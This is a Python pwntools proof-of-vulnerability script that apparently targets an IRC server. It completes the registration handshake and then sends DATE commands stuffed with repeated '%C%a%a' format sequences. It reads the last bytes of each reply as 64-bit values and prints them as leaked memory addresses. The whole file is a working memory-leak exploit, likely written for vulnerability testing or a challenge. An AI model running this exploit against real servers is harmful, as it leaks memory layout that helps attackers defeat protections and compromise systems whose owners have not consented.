import sys
import signal
from pwn import *

def handler( signum, frame):
    print('[FAIL] sigalrm fired so the POV was likely unuccessful')
    exit(0)

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)
    
    p = remote( HOST, PORT )

    p.send(b'CAP LS\r\n')
    print(p.readuntil(b'\r\n'))
    p.send(b'NICK vagrant\r\n')
    p.send(b'USER vagrant vagrant localhost :vagrant\r\n')
    p.send(b'CAP REQ :multi-prefix\r\n')
    y = p.readuntil(b'\r\n').rstrip()

    if y.startswith(b'PING') == True:
        z = y.split(b':')[1]
        p.send(b'PONG :' + z + b'\r\n')

    p.send(b'CAP END\r\n')
    print(p.readuntil(b':+ix\r\n'))

    for i in range(10):
        p.send(b'DATE ' + b'%C%a%a'*(i) + b'\r\n')
        y = p.readuntil(b'\r\n').rstrip(b'\r\n')
        possible_leak = y[-6:] + b'\x00\x00'

        l = u64(possible_leak)
        print(b'[ADDR] ', hex(l))

    p.close()

    print('[SUCCESS?] Check leaked addresses')

if __name__ == '__main__':
    main()
